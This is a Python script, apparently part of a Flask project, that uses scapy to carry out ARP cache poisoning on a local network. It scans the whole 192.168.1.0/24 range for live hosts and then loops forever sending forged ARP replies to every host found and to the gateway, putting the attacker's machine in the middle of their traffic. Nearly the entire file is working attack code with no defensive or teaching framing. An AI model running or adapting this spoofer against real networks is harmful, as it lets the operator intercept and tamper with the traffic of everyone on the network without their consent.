# solutions of methods send_ARP, get_MAC a start_poison_thread was inspirated on this link - https://github.com/ickerwx/arpspoof/blob/master/arpspoof.py  
# methods send_ARP and get_MAC were simplified 
# in method start_poison_thread I just use basic idea, other code was implemented by me

import threading
import time
from scapy.all import *

IP = 0
MAC = TARGET = 1

# this solution of thread with return value was inspirated on this link - https://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None, args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs)
        self._return = None
    def run(self):
        if self._target is not None:
            self._return = self._target(*self._args, **self._kwargs)
    def join(self, *args):
        Thread.join(self, *args)
        return self._return

# function where we create ARP request and send it to target_IP
def get_MAC(interface, target_IP):
    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
    p.hwdst = 'ff:ff:ff:ff:ff:ff'
    p.pdst = target_IP
    reply, unans = sr(p, timeout=1, verbose=0)
    if len(unans) > 0:
        return 
    return reply[0][1].hwsrc


# poison function, sending every 2 seconds ARP packet
def start_poison_thread(targets, gateway, attacker_MAC):
    finish = False
    while not finish:
        for t in targets:
            send_ARP(t[IP], t[MAC], gateway[IP], attacker_MAC)
            send_ARP(gateway[IP], gateway[MAC], t[IP], attacker_MAC)
        time.sleep(2)

def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    arp_packet = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                     psrc=source_IP, hwsrc=source_MAC)
    send(arp_packet, verbose=0)


# main spoofer function, called on flask startup 
# in this funcion we found out which IP addresses on local network are active
# and then we start poisoning them
def spoofer():
    gateway = "192.168.1.1"             # set gateway IP address
    # eth0 - lan cable
    # wlan0 - wifi
    interface = "wlan0"                 # set interface using on local device
    attacker_MAC = get_if_hwaddr(interface)
    targets = []
    threads = []
    threadsNum = 0

    potentialTargets = []
    for i in range(2, 255):             # create list of potential targets
        ip = "192.168.1." + str(i)
        potentialTargets.append(ip)

    for t in potentialTargets:          # for each IP address create thread and send ARP request
        threads.append(ThreadWithReturnValue(target=get_MAC, args=(interface, t)))       # chceck all IP address if the are active
        threads[threadsNum].daemon = True
        threads[threadsNum].start()
        time.sleep(0.01)
        threadsNum+=1

    threadsNum = 0
    time.sleep(2)

    for t in potentialTargets:           # chech if target response on ARP 
        mac = threads[threadsNum].join()
        if(mac):                        # if we have mac adress of target, add to list of poisoning targets
            targets.append((t, mac))
        threadsNum+=1

    gateway = (gateway, get_MAC(interface, gateway))
    print("------ start poisoning all detected IP adresses -----------")
    print(targets)

    # create and start the poison thread
    poison_thread = threading.Thread(target=start_poison_thread, args=(targets, gateway, attacker_MAC))
    poison_thread.start()

